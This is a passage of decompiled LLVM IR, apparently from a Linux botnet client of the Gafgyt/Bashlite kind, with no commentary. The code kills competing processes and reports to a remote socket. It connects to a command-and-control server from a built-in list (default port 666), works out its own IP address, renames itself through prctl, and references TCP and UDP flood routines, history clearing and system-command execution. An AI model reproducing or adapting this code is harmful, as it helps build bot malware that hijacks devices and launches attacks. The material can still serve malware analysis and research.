  br i1 %v2_106fc, label %dec_label_pc_10704, label %dec_label_pc_10838

dec_label_pc_10704:                               ; preds = %dec_label_pc_106e4
  br label %dec_label_pc_107a8

dec_label_pc_10718:                               ; preds = %dec_label_pc_107a8, %dec_label_pc_107dc
  %v3_1071c = mul i32 %storemerge11, 4
  %v2_10728 = load i32, i32* @global_var_2e7d8.71, align 4
  %v2_1072c = add i32 %v2_10728, %v3_1071c
  %v1_10730 = inttoptr i32 %v2_1072c to i32*
  %v2_10730 = load i32, i32* %v1_10730, align 4
  %v2_10734 = icmp eq i32 %v2_10730, 0
  br i1 %v2_10734, label %dec_label_pc_1079c, label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_10718
  %v2_10754 = load i32, i32* %v1_10730, align 4
  store i32 %v2_10754, i32* @r4, align 4
  %v0_10758 = call i32 @__GI_getpid()
  store i32 %v0_10758, i32* @r0, align 4
  %v0_10760 = load i32, i32* @r4, align 4
  %v9_10760 = icmp eq i32 %v0_10760, %v0_10758
  br i1 %v9_10760, label %dec_label_pc_1079c, label %dec_label_pc_10768

dec_label_pc_10768:                               ; preds = %dec_label_pc_1073c
  %v2_10778 = load i32, i32* @global_var_2e7d8.71, align 4
  %v2_1077c = add i32 %v2_10778, %v3_1071c
  %v1_10780 = inttoptr i32 %v2_1077c to i32*
  %v2_10780 = load i32, i32* %v1_10780, align 4
  %v2_1078c = call i32 @kill(i32 %v2_10780, i32 9)
  store i32 %v2_1078c, i32* @r0, align 4
  %v1_10794 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_1073c, %dec_label_pc_10718, %dec_label_pc_10768
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_10718 ], [ %stack_var_-48.1, %dec_label_pc_1073c ], [ %v1_10794, %dec_label_pc_10768 ]
  %v1_107a0 = add i32 %storemerge11, 1
  br label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_10704, %dec_label_pc_1079c
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_10704 ], [ %stack_var_-48.0, %dec_label_pc_1079c ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_10704 ], [ %v1_107a0, %dec_label_pc_1079c ]
  %v5_107c0 = load i32, i32* @global_var_2857c.69, align 4
  %v9_107d4 = icmp eq i32 %v5_107c0, 0
  br i1 %v9_107d4, label %dec_label_pc_107dc, label %dec_label_pc_10718

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107a8
  %v2_107c0 = load i32, i32* @global_var_28578.68, align 4
  store i32 0, i32* @r2, align 4
  %tmp99 = icmp ugt i32 %v2_107c0, %storemerge11
  br i1 %tmp99, label %dec_label_pc_10718, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107dc
  %tmp98 = icmp slt i32 %stack_var_-48.1, 1
  %v2_10828 = load i32, i32* @global_var_28570.50, align 4
  br i1 %tmp98, label %dec_label_pc_10824, label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_107fc
  store i32 %stack_var_-48.1, i32* @r2, align 4
  %v3_1081c = call i32 @sockprintf(i32 %v2_10828, i32 ptrtoint ([11 x i8]* @global_var_263cc.921 to i32))
  br label %dec_label_pc_10838

dec_label_pc_10824:                               ; preds = %dec_label_pc_107fc
  %v3_10834 = call i32 @sockprintf(i32 %v2_10828, i32 ptrtoint ([13 x i8]* @global_var_263d8.923 to i32))
  br label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_106e4, %dec_label_pc_10808, %dec_label_pc_10824
  %v2_1083c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_263e8.925 to i32), i32* @r1, align 4
  %v3_10848 = inttoptr i32 %v2_1083c to i8*
  %v4_10848 = call i32 @__GI_strcoll(i8* %v3_10848, i32 ptrtoint ([10 x i8]* @global_var_263e8.925 to i32))
  %v2_10850 = icmp eq i32 %v4_10848, 0
  br i1 %v2_10850, label %dec_label_pc_10858, label %dec_label_pc_10860

dec_label_pc_10858:                               ; preds = %dec_label_pc_10838
  %v1_1085c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_fdd4, %dec_label_pc_fd6c, %dec_label_pc_10270, %dec_label_pc_10480, %dec_label_pc_106bc, %dec_label_pc_10838, %dec_label_pc_fdf8, %dec_label_pc_f99c, %dec_label_pc_f84c, %dec_label_pc_10148, %dec_label_pc_f920, %dec_label_pc_f7e4, %dec_label_pc_10514, %dec_label_pc_1038c, %dec_label_pc_ff48, %dec_label_pc_f704, %dec_label_pc_fc04, %dec_label_pc_fa98, %dec_label_pc_f9c4, %dec_label_pc_f884, %dec_label_pc_f780, %dec_label_pc_f73c, %dec_label_pc_10858
  %v1_10868 = phi i32 [ %v0_10270, %dec_label_pc_10270 ], [ %v0_10480, %dec_label_pc_10480 ], [ %v0_106bc, %dec_label_pc_106bc ], [ %v4_10848, %dec_label_pc_10838 ], [ %v0_fdf8, %dec_label_pc_fdf8 ], [ 0, %dec_label_pc_f99c ], [ 0, %dec_label_pc_f84c ], [ 0, %dec_label_pc_10148 ], [ 0, %dec_label_pc_f920 ], [ 0, %dec_label_pc_f7e4 ], [ %v3_10524, %dec_label_pc_10514 ], [ %v3_1039c, %dec_label_pc_1038c ], [ %v3_ff58, %dec_label_pc_ff48 ], [ %v3_f714, %dec_label_pc_f704 ], [ %v3_fc14, %dec_label_pc_fc04 ], [ %v3_fabc, %dec_label_pc_fa98 ], [ %v0_f9ac, %dec_label_pc_f9c4 ], [ %v0_f85c, %dec_label_pc_f884 ], [ %v1_f798, %dec_label_pc_f780 ], [ %v3_f758, %dec_label_pc_f73c ], [ %v1_1085c, %dec_label_pc_10858 ], [ 0, %dec_label_pc_fd6c ], [ 0, %dec_label_pc_fdd4 ]
  store i32 %v3_f5a0, i32* @r4, align 4
  store i32 %v6_f5a0, i32* @r5, align 4
  store i32 %v9_f5a0, i32* @r6, align 4
  store i32 %v12_f5a0, i32* @r7, align 4
  store i32 %v15_f5a0, i32* @r8, align 4
  store i32 %v18_f5a0, i32* @fp, align 4
  ret i32 %v1_10868

; uselistorder directives
  uselistorder i32 %v2_10828, { 1, 0 }
  uselistorder i32 %stack_var_-48.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_1071c, { 1, 0 }
  uselistorder i32 %v2_106a0, { 2, 1, 0 }
  uselistorder i32 %v1_10568, { 1, 0 }
  uselistorder i32 %v1_1054c, { 1, 0 }
  uselistorder i32 %v2_10534, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v2_10464, { 2, 1, 0 }
  uselistorder i32 %v1_103e0, { 1, 0 }
  uselistorder i32 %v1_103c4, { 1, 0 }
  uselistorder i32 %v2_103ac, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v2_10254, { 1, 0 }
  uselistorder i32* %v1_1015c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_100c8, { 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_ffb8, { 1, 0 }
  uselistorder i32 %v1_ff9c, { 1, 0 }
  uselistorder i32 %v1_ff80, { 1, 0 }
  uselistorder i32 %v2_ff68, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v2_fddc, { 2, 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v1_fc74, { 1, 0 }
  uselistorder i32 %v1_fc58, { 1, 0 }
  uselistorder i32 %v1_fc3c, { 1, 0 }
  uselistorder i32 %v2_fc24, { 2, 1, 0, 4, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 6, 7, 8, 9, 21, 4, 22, 23, 24, 25, 3, 26, 27, 28, 2, 1, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1e878.403 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_261a0.878 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_2e7d4.874, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1df24.52 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_260cc.851 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_2607c.845 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10860, { 22, 5, 4, 12, 3, 13, 2, 9, 14, 6, 0, 1, 16, 17, 18, 7, 10, 19, 8, 11, 20, 21, 15 }
  uselistorder label %dec_label_pc_10838, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107a8, { 1, 0 }
  uselistorder label %dec_label_pc_1079c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10718, { 1, 0 }
  uselistorder label %dec_label_pc_106e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10698, { 1, 0 }
  uselistorder label %dec_label_pc_10670, { 1, 0 }
  uselistorder label %dec_label_pc_104a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1045c, { 1, 0 }
  uselistorder label %dec_label_pc_10424, { 1, 0 }
  uselistorder label %dec_label_pc_10320, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1024c, { 1, 0 }
  uselistorder label %dec_label_pc_1019c, { 1, 0 }
  uselistorder label %dec_label_pc_10128, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100c0, { 1, 0 }
  uselistorder label %dec_label_pc_1007c, { 1, 0 }
  uselistorder label %dec_label_pc_1003c, { 1, 0 }
  uselistorder label %dec_label_pc_10004, { 1, 0 }
  uselistorder label %dec_label_pc_ff60, { 1, 0 }
  uselistorder label %dec_label_pc_fe44, { 1, 0 }
  uselistorder label %dec_label_pc_fdd4, { 1, 0 }
  uselistorder label %dec_label_pc_fd88, { 1, 0 }
  uselistorder label %dec_label_pc_fd48, { 1, 0 }
  uselistorder label %dec_label_pc_fd10, { 1, 0 }
  uselistorder label %dec_label_pc_fccc, { 1, 0 }
  uselistorder label %dec_label_pc_fc1c, { 1, 0 }
  uselistorder label %dec_label_pc_fa78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f978, { 1, 0 }
  uselistorder label %dec_label_pc_f8dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f828, { 1, 0 }
  uselistorder label %dec_label_pc_f6e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f6a0, { 1, 0 }
  uselistorder label %dec_label_pc_f65c, { 1, 0 }
  uselistorder label %dec_label_pc_f618, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_10870 = load i32, i32* @fp, align 4
  store i32 67704, i32* %stack_var_-4, align 4
  %v2_10874 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10874, i32* @fp, align 4
  %v2_10888 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_10898 = bitcast i32* %stack_var_-4116 to i8*
  %v3_10898 = call i32 @__GI_memset(i8* %v2_10898, i32 0)
  %v2_108a0 = load i32, i32* @global_var_28570.50, align 4
  %v2_108a4 = icmp eq i32 %v2_108a0, 0
  br i1 %v2_108a4, label %dec_label_pc_108c8, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %entry
  %v1_108b8 = call i32 @__GI_close(i32 %v2_108a0)
  store i32 0, i32* @global_var_28570.50, align 4
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %entry, %dec_label_pc_108ac
  %v2_108cc = load i32, i32* @global_var_281f0.928, align 4
  %v2_108d0 = icmp eq i32 %v2_108cc, 0
  br i1 %v2_108d0, label %dec_label_pc_108fc, label %dec_label_pc_108e8

dec_label_pc_108e8:                               ; preds = %dec_label_pc_108c8
  %v1_108f0 = add i32 %v2_108cc, 1
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108c8, %dec_label_pc_108e8
  %storemerge1 = phi i32 [ %v1_108f0, %dec_label_pc_108e8 ], [ 0, %dec_label_pc_108c8 ]
  store i32 %storemerge1, i32* @global_var_281f0.928, align 4
  %v4_10914 = mul i32 %storemerge1, 4
  %v5_10914 = add i32 %v4_10914, ptrtoint ([18 x i8]** @global_var_281ec.930 to i32)
  %v6_10914 = inttoptr i32 %v5_10914 to i32*
  %v7_10914 = load i32, i32* %v6_10914, align 4
  store i32 %v7_10914, i32* @r1, align 4
  %v3_10920 = call i32 @strcpy(i8* %v2_10898, i32 %v7_10914)
  store i32 %v2_10888, i32* @r0, align 4
  %v2_10944 = call i32 @__GI_strchr(i32 %v2_10888, i32 58)
  %v2_1094c = icmp eq i32 %v2_10944, 0
  br i1 %v2_1094c, label %dec_label_pc_109ac, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %dec_label_pc_108fc
  store i32 %v2_10888, i32* @r0, align 4
  %v2_10968 = call i32 @__GI_strchr(i32 %v2_10888, i32 58)
  %v1_10970 = add i32 %v2_10968, 1
  store i32 %v1_10970, i32* @r0, align 4
  %v1_10978 = call i32 @atol(i32 %v1_10970)
  store i32 %v2_10888, i32* @r0, align 4
  %v2_10998 = call i32 @__GI_strchr(i32 %v2_10888, i32 58)
  %v3_109a8 = inttoptr i32 %v2_10998 to i8*
  store i8 0, i8* %v3_109a8, align 1
  br label %dec_label_pc_109ac

dec_label_pc_109ac:                               ; preds = %dec_label_pc_108fc, %dec_label_pc_10954
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_108fc ], [ %v1_10978, %dec_label_pc_10954 ]
  %v3_109b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_109b8, i32* @global_var_28570.50, align 4
  %v4_109ec = call i32 @connectTimeout(i32 %v3_109b8, i32 %v2_10888, i32 %stack_var_-20.0, i32 30)
  %v2_109f4 = icmp eq i32 %v4_109ec, 0
  %. = zext i1 %v2_109f4 to i32
  store i32 %v3_10870, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_10888, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_109ac, { 1, 0 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10a40 = load i32, i32* @fp, align 4
  store i32 %v3_10a40, i32* %stack_var_-16, align 4
  %v3_10a5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_10a6c = icmp eq i32 %v3_10a5c, -1
  br i1 %v3_10a6c, label %dec_label_pc_10a74, label %dec_label_pc_10a84

dec_label_pc_10a74:                               ; preds = %entry
  br label %dec_label_pc_10cc0

dec_label_pc_10a84:                               ; preds = %entry
  %v2_10a84 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_10a94 = bitcast i32* %stack_var_-52 to i8*
  %v3_10a94 = call i32 @__GI_memset(i8* %v2_10a94, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_263f4.932 to i32), i32* @r0, align 4
  %v2_10aa4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_263f4.932 to i32))
  %v1_10ab4 = call i32 @__GI_htons(i32 53)
  %v3_10ad0 = call i32 @__libc_connect(i32 %v3_10a5c, i32 %v2_10a84, i32 16)
  %v3_10ae0 = icmp eq i32 %v3_10ad0, -1
  br i1 %v3_10ae0, label %dec_label_pc_10ae8, label %dec_label_pc_10af8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10a84
  br label %dec_label_pc_10cc0

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10a84
  store i32 16, i32* %stack_var_-72, align 4
  %v2_10b00 = ptrtoint i32* %stack_var_-68 to i32
  %v2_10b04 = ptrtoint i32* %stack_var_-72 to i32
  %v5_10b10 = call i32 @__GI_getsockname(i32 %v3_10a5c, i32 %v2_10b00, i32 %v2_10b04, i32 %v2_10b00, i32 16)
  %v3_10b20 = icmp eq i32 %v5_10b10, -1
  br i1 %v3_10b20, label %dec_label_pc_10b28, label %dec_label_pc_10b38

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10af8
  br label %dec_label_pc_10cc0

dec_label_pc_10b38:                               ; preds = %dec_label_pc_10af8
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2e7cc.314 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_2e7cc.314, align 4
  %v3_10b4c = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_263fc.935 to i32), i32 0)
  %v2_10be4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_10bdc

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10bdc
  %v4_10b70 = call i32 @strstr(i32 %v2_10be4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2640c.937, i32 0, i32 0))
  %v2_10b78 = icmp eq i32 %v4_10b70, 0
  br i1 %v2_10b78, label %dec_label_pc_10bc0, label %dec_label_pc_10ba0.preheader

dec_label_pc_10ba0.preheader:                     ; preds = %dec_label_pc_10b5c
  %v2_10ba49 = load i8, i8* %stack_var_-4168, align 1
  %v7_10ba813 = icmp eq i8 %v2_10ba49, 9
  br i1 %v7_10ba813, label %dec_label_pc_10bb0, label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10ba0.preheader, %dec_label_pc_10b94
  %v4_10ba014 = phi i32 [ %v1_10b98, %dec_label_pc_10b94 ], [ %v2_10be4, %dec_label_pc_10ba0.preheader ]
  %v1_10b98 = add i32 %v4_10ba014, 1
  %v5_10b9c = inttoptr i32 %v1_10b98 to i8*
  %v2_10ba4 = load i8, i8* %v5_10b9c, align 1
  %v7_10ba8 = icmp eq i8 %v2_10ba4, 9
  br i1 %v7_10ba8, label %dec_label_pc_10bb0, label %dec_label_pc_10b94

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10b94, %dec_label_pc_10ba0.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_10ba0.preheader ], [ %v5_10b9c, %dec_label_pc_10b94 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_10c04

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10b5c
  store i32 4096, i32* @r2, align 4
  %v3_10bd8 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_10bdc

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10b38, %dec_label_pc_10bc0
  %v4_10bf4 = call i32 @fdgets(i32 %v2_10be4, i32 4096, i32 %v3_10b4c, i32 %v2_10be4)
  %v2_10bfc = icmp eq i32 %v4_10bf4, 0
  br i1 %v2_10bfc, label %dec_label_pc_10c04, label %dec_label_pc_10b5c

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10bb0
  %v1_10c08 = call i32 @__GI_close(i32 %v3_10b4c)
  %v4_10c18 = load i8, i8* %stack_var_-4168, align 1
  %v2_10c1c = icmp eq i8 %v4_10c18, 0
  br i1 %v2_10c1c, label %dec_label_pc_10cb4, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c04
  %v2_10c2c = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_10be4, i32* @r1, align 4
  %v2_10c44 = bitcast i32* %stack_var_-4200 to i8*
  %v3_10c44 = call i32 @strcpy(i8* %v2_10c44, i32 %v2_10be4)
  store i32 %v2_10c2c, i32* @r3, align 4
  %v3_10c64 = call i32 @ioctl(i32 %v3_10a5c, i32 35111, i32 %v2_10c2c)
  %v2_10c84 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c24, %dec_label_pc_10c74
  %storemerge47 = phi i32 [ 0, %dec_label_pc_10c24 ], [ %v1_10ca0, %dec_label_pc_10c74 ]
  %v2_10c8c = add i32 %storemerge47, %v2_10c84
  %v1_10c90 = inttoptr i32 %v2_10c8c to i8*
  %v2_10c90 = load i8, i8* %v1_10c90, align 1
  %v4_10c98 = add i32 %storemerge47, ptrtoint (i32* @global_var_28580.939 to i32)
  %v5_10c98 = inttoptr i32 %v4_10c98 to i8*
  store i8 %v2_10c90, i8* %v5_10c98, align 1
  %v1_10ca0 = add nuw nsw i32 %storemerge47, 1
  %v7_10cb0 = icmp slt i32 %v1_10ca0, 6
  br i1 %v7_10cb0, label %dec_label_pc_10c74, label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c74, %dec_label_pc_10c04
  %v1_10cb8 = call i32 @__GI_close(i32 %v3_10a5c)
  %v3_10cd4.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10b28, %dec_label_pc_10ae8, %dec_label_pc_10a74
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10cb4, %dec_label_pc_10cc0
  %v3_10cd4 = phi i32 [ %v3_10cd4.pre, %dec_label_pc_10cb4 ], [ 0, %dec_label_pc_10cc0 ]
  %v2_10cdc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10cdc, i32* @fp, align 4
  ret i32 %v3_10cd4

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_10b98, { 1, 0 }
  uselistorder i32 %v2_10be4, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_10a5c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 12, 11, 10, 1, 9, 8, 7, 6, 5, 13, 4, 3, 2, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0 }
  uselistorder label %dec_label_pc_10c74, { 1, 0 }
  uselistorder label %dec_label_pc_10bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10b94, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_10cf8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10cf8, i32* @ip, align 4
  ret i32 ptrtoint ([7 x i8]* @global_var_26418.941 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10d20 = load i32, i32* @r4, align 4
  store i32 %v3_10d20, i32* %stack_var_-24, align 4
  store i32 68904, i32* %stack_var_-4, align 4
  %v19_10d20 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10d24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10d24, i32* @fp, align 4
  %v1_10d68 = bitcast i8** %argv to i32*
  %v2_10d68 = load i32, i32* %v1_10d68, align 4
  store i32 %v2_10d68, i32* @r4, align 4
  %v2_10d80 = load i32, i32* %v1_10d68, align 4
  %v1_10d84 = inttoptr i32 %v2_10d80 to i8*
  %v3_10d88 = call i32 @strlen(i8* %v1_10d84)
  %v0_10d90 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26420.943 to i32), i32* @r1, align 4
  %v3_10d9c = call i32 @strncpy(i32 %v0_10d90, i32 ptrtoint (i32* @global_var_26420.943 to i32), i32 %v3_10d88)
  store i32 ptrtoint (i32* @global_var_26420.943 to i32), i32* %v1_10d68, align 4
  %v5_10dd8 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_26420.943 to i32), i32 0, i32 0, i32 0)
  %v2_10de0 = call i32 @__GI_time(i32* null)
  store i32 %v2_10de0, i32* @r0, align 4
  store i32 %v2_10de0, i32* @r4, align 4
  %v0_10de8 = call i32 @__GI_getpid()
  %v0_10df0 = load i32, i32* @r4, align 4
  %v2_10df0 = xor i32 %v0_10df0, %v0_10de8
  %v1_10df8 = call i32 @srand(i32 %v2_10df0)
  %v2_10e00 = call i32 @__GI_time(i32* null)
  store i32 %v2_10e00, i32* @r0, align 4
  store i32 %v2_10e00, i32* @r4, align 4
  %v0_10e08 = call i32 @__GI_getpid()
  %v0_10e10 = load i32, i32* @r4, align 4
  %v2_10e10 = xor i32 %v0_10e10, %v0_10e08
  %v1_10e18 = call i32 @init_rand(i32 %v2_10e10)
  store i32 ptrtoint ([19 x i8]* @global_var_26424.945 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_26438.947 to i32), i32* @r1, align 4
  %v3_10e34 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_26424.945 to i32), i32 ptrtoint ([2 x i8]* @global_var_26438.947 to i32))
  %v2_10e44 = icmp eq i32 %v3_10e34, 0
  br i1 %v2_10e44, label %dec_label_pc_10e4c, label %dec_label_pc_10e68

dec_label_pc_10e4c:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_2643c.949 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_26438.947 to i32), i32* @r1, align 4
  %v3_10e5c = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_2643c.949 to i32), i32 ptrtoint ([2 x i8]* @global_var_26438.947 to i32))
  br label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %entry, %dec_label_pc_10e4c
  %stack_var_-88.0 = phi i32 [ %v3_10e5c, %dec_label_pc_10e4c ], [ %v3_10e34, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2643c.949, i32 0, i32 0), %dec_label_pc_10e4c ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_26424.945, i32 0, i32 0), %entry ]
  %v2_10e6c = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_10e6c, label %dec_label_pc_11004, label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e68
  %v2_10e84 = load i32, i32* %v1_10d68, align 4
  %v1_10e88 = inttoptr i32 %v2_10e84 to i8*
  %v3_10e8c = call i32 @strlen(i8* %v1_10e88)
  %v2_10ea0 = ptrtoint i32* %stack_var_-368 to i32
  %v2_10eac = call i32 @getcwd(i32 %v2_10ea0, i32 256)
  store i32 ptrtoint (i32* @global_var_2644c.951 to i32), i32* @r1, align 4
  %v2_10ebc = bitcast i32* %stack_var_-368 to i8*
  %v3_10ebc = call i32 @__GI_strcoll(i8* %v2_10ebc, i32 ptrtoint (i32* @global_var_2644c.951 to i32))
  %v2_10ec4 = icmp eq i32 %v3_10ebc, 0
  br i1 %v2_10ec4, label %dec_label_pc_10ffc, label %dec_label_pc_10edc

dec_label_pc_10ed0:                               ; preds = %dec_label_pc_10edc
  %v1_10ed4 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10e74, %dec_label_pc_10ed0
  %stack_var_-84.0 = phi i32 [ %v1_10ed4, %dec_label_pc_10ed0 ], [ %v3_10e8c, %dec_label_pc_10e74 ]
  %v2_10eec = load i32, i32* %v1_10d68, align 4
  %v2_10ef4 = add i32 %v2_10eec, %stack_var_-84.0
  %v1_10ef8 = inttoptr i32 %v2_10ef4 to i8*
  %v2_10ef8 = load i8, i8* %v1_10ef8, align 1
